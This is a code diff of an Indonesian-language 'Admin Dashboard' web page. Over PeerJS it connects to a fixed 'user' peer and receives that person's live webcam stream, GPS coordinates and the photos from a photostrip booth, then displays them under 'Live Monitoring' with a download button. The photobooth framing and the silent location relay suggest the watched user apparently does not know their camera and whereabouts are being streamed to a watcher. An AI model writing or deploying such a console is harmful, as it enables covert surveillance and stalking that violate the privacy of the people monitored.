@@ -2,45 +2,107 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Halaman Admin - (Debug)</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; background-color: #f4f4f9; }
-        h1, h2 { color: #333; }
-        #container { max-width: 640px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
-        video { width: 100%; border: 1px solid #ccc; background-color: #000; }
-        #lokasi-remote, #status { margin-top: 15px; font-size: 1.1em; }
-        #status.connected { color: #28a745; }
-        #status.waiting { color: #dc3545; }
-    </style>
+    <title>Admin Dashboard</title>
+    <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
+        body { font-family: 'Poppins', sans-serif; }
+    </style>
 </head>
-<body>
-    <div id="container">
-        <h1>Halaman Admin</h1>
-        <p>Secara otomatis mencari dan menampilkan data dari halaman pengguna.</p>
-        
-        <div id="status" class="waiting">Status: Mencoba terhubung ke pengguna...</div>
+<body class="bg-slate-100 flex items-center justify-center min-h-screen p-4">
 
-        <h2 style="margin-top: 20px;">Video dari Pengguna:</h2>
-        <!-- Perubahan: Tambahkan muted dan playsinline -->
-        <video id="remote-video" autoplay playsinline muted></video>
+    <!-- Canvas tersembunyi untuk menggabungkan hasil akhir photostrip -->
+    <canvas id="result-canvas" class="hidden"></canvas>
+
+    <div class="w-full max-w-6xl bg-white rounded-2xl shadow-2xl p-6 md:p-8 mx-auto flex flex-col md:flex-row gap-8">
         
-        <div id="lokasi-remote">Lokasi Pengguna: Menunggu data...</div>
+        <!-- Kolom Kiri: Live Stream -->
+        <div class="flex-grow flex flex-col">
+            <h1 class="text-2xl md:text-3xl font-bold text-slate-800 text-center">Live Monitoring</h1>
+            <p id="status" class="text-slate-500 text-center mb-4">Mencoba terhubung ke pengguna...</p>
+            <div class="w-full aspect-video rounded-lg bg-black overflow-hidden shadow-lg">
+                <video id="remote-video" autoplay playsinline muted class="w-full h-full object-cover"></video>
+            </div>
+            <div id="lokasi-remote" class="mt-4 text-center text-slate-600">Lokasi: Menunggu data...</div>
+        </div>
+        
+        <!-- Kolom Kanan: Hasil Jepretan -->
+        <div class="w-full md:w-[280px] flex-shrink-0">
+            <h2 class="text-xl font-bold text-slate-700 mb-4 text-center">Hasil Jepretan</h2>
+            <div id="photostrip-preview" class="bg-slate-800 rounded-lg p-3 space-y-3 shadow-inner">
+                <!-- Placeholder untuk 4 foto -->
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 1</div>
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 2</div>
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 3</div>
+                <div class="aspect-[4/3] bg-slate-700 rounded flex items-center justify-center text-slate-500 font-semibold">Foto 4</div>
+            </div>
+            <div class="grid grid-cols-2 gap-4 mt-4">
+                <button id="download-btn" disabled class="w-full bg-pink-500 text-white font-bold py-3 px-6 rounded-full text-lg transition-all shadow-lg disabled:bg-slate-300 disabled:cursor-not-allowed">Download</button>
+                <button id="clear-btn" disabled class="w-full bg-white text-pink-500 font-bold py-3 px-6 rounded-full text-lg transition-all border-2 border-pink-500 shadow-lg disabled:border-slate-300 disabled:text-slate-300 disabled:cursor-not-allowed">Bersihkan</button>
+            </div>
+        </div>
+
     </div>
 
     <script>
-        const TARGET_PEER_ID = 'layar-utama-pengguna-kamera-v3'; // ID baru yang sama dengan di pengguna
-        const peer = new Peer(); 
+        const TARGET_PEER_ID = 'layar-utama-pengguna-kamera-v3';
+        const peer = new Peer();
+        const MAX_PHOTOS = 4;
 
+        // --- Seleksi Elemen DOM ---
         const remoteVideo = document.getElementById('remote-video');
         const lokasiRemoteDiv = document.getElementById('lokasi-remote');
         const statusDiv = document.getElementById('status');
+        const photostripPreview = document.getElementById('photostrip-preview');
+        const downloadBtn = document.getElementById('download-btn');
+        const clearBtn = document.getElementById('clear-btn');
+        const resultCanvas = document.getElementById('result-canvas');
 
-        console.log("LOG ADMIN: Skrip dimulai.");
+        let receivedPhotos = [];
 
-        peer.on('open', (id) => {
-            console.log(`LOG ADMIN: Berhasil terdaftar di server PeerJS dengan ID sendiri: ${id}`);
-            console.log(`LOG ADMIN: Akan mencoba terhubung ke pengguna dengan ID: ${TARGET_PEER_ID}`);
+        // --- Fungsi Logika UI Admin ---
+        function startOverAdmin() {
+            receivedPhotos = [];
+            for (let i = 0; i < MAX_PHOTOS; i++) {
+                const slot = photostripPreview.children[i];
+                slot.innerHTML = `Foto ${i + 1}`;
+                slot.classList.add('flex', 'items-center', 'justify-center', 'text-slate-500', 'font-semibold');
+            }
+            downloadBtn.disabled = true;
+            clearBtn.disabled = true;
+        }
+
+        function downloadPhotoStripAdmin() {
+            // Logika ini sama persis dengan di index.html, hanya menggunakan array `receivedPhotos`
+            const ctx = resultCanvas.getContext('2d');
+            const photoWidth = 600, photoHeight = 450, padding = 20;
+            resultCanvas.width = photoWidth + (padding * 2);
+            resultCanvas.height = (photoHeight * MAX_PHOTOS) + (padding * (MAX_PHOTOS + 1));
+            ctx.fillStyle = '#1e293b';
+            ctx.fillRect(0, 0, resultCanvas.width, resultCanvas.height);
+
+            let imagesLoaded = 0;
+            receivedPhotos.forEach((dataUrl, index) => {
+                const img = new Image();
+                img.src = dataUrl;
+                img.onload = () => {
+                    const y = (photoHeight * index) + (padding * (index + 1));
+                    ctx.drawImage(img, padding, y, photoWidth, photoHeight);
+                    imagesLoaded++;
+                    if (imagesLoaded === MAX_PHOTOS) {
+                        const finalImage = resultCanvas.toDataURL('image/png');
+                        const link = document.createElement('a');
+                        link.href = finalImage;
+                        link.download = `photostrip-capture-${Date.now()}.png`;
+                        link.click();
+                    }
+                };
+            });
+        }
+
+        // --- Logika Koneksi PeerJS ---
+        peer.on('open', () => {
             connectToUser();
         });
 
@@ -48,54 +110,55 @@
             const conn = peer.connect(TARGET_PEER_ID);
 
             conn.on('open', () => {
-                console.log("LOG ADMIN: Koneksi data ke pengguna berhasil dibuat (terbuka).");
-                statusDiv.textContent = 'Status: Terhubung! Meminta stream video...';
-                statusDiv.className = 'connected';
-                
-                console.log("LOG ADMIN: Mengirim perintah 'call-me' ke pengguna.");
+                statusDiv.textContent = 'Terhubung! Meminta stream video...';
                 conn.send({ command: 'call-me' });
 
+                // >>> INI BAGIAN UTAMA PENERIMA DATA <<<
                 conn.on('data', (data) => {
-                    if(data.lat && data.lon) {
-                        lokasiRemoteDiv.innerHTML = `Lokasi Pengguna:<br>Latitude: ${data.lat.toFixed(5)}<br>Longitude: ${data.lon.toFixed(5)}`;
+                    // Cek tipe pesan yang masuk
+                    if (data.type === 'photo-capture') {
+                        const { index, dataUrl } = data.payload;
+                        receivedPhotos[index] = dataUrl;
+                        
+                        const previewSlot = photostripPreview.children[index];
+                        previewSlot.innerHTML = `<img src="${dataUrl}" class="w-full h-full object-cover rounded">`;
+
+                        // Cek jika semua foto sudah diterima
+                        if (receivedPhotos.filter(Boolean).length === MAX_PHOTOS) {
+                            downloadBtn.disabled = false;
+                            clearBtn.disabled = false;
+                        }
+                    } else if (data.type === 'retake') {
+                        startOverAdmin();
+                    } else if (data.lat && data.lon) {
+                        // Handle data lokasi (masih berfungsi)
+                        lokasiRemoteDiv.innerHTML = `Lokasi: ${data.lat.toFixed(5)}, ${data.lon.toFixed(5)}`;
                     }
                 });
             });
-            
-            conn.on('error', (err) => {
-                console.error("LOG ADMIN: Error pada koneksi data!", err);
-            });
+
+            conn.on('error', () => { statusDiv.textContent = 'Gagal terhubung. Mencoba lagi...'; setTimeout(connectToUser, 5000); });
         }
         
+        // Menerima panggilan video (tidak berubah)
         peer.on('call', (call) => {
-            console.log("LOG ADMIN: Panggilan video masuk diterima dari pengguna!");
-            
-            // Jawab panggilan
             call.answer(); 
-            
             call.on('stream', (remoteStream) => {
-                console.log("LOG ADMIN: STREAM VIDEO DITERIMA! Menampilkannya di elemen video.");
-                statusDiv.textContent = 'Status: Stream video diterima!';
+                statusDiv.textContent = 'Stream video diterima!';
                 remoteVideo.srcObject = remoteStream;
-                // Coba putar secara manual untuk memastikan
-                remoteVideo.play().catch(e => console.error("LOG ADMIN: Gagal memutar video secara otomatis:", e));
-            });
-
-            call.on('close', () => {
-                console.log("LOG ADMIN: Panggilan video ditutup oleh pengguna.");
-            });
-             call.on('error', (err) => {
-                console.error("LOG ADMIN: Error pada saat panggilan berlangsung!", err);
             });
         });
 
         peer.on('error', (err) => {
-            console.error("LOG ADMIN: Terjadi error pada PeerJS!", err);
             if (err.type === 'peer-unavailable') {
-                statusDiv.textContent = 'Status: Pengguna tidak ditemukan. Mencoba lagi dalam 5 detik...';
+                statusDiv.textContent = 'Pengguna tidak ditemukan. Mencoba lagi...';
                 setTimeout(connectToUser, 5000);
             }
         });
+
+        // --- Event Listeners ---
+        downloadBtn.addEventListener('click', downloadPhotoStripAdmin);
+        clearBtn.addEventListener('click', startOverAdmin);
     </script>
 </body>
 </html>
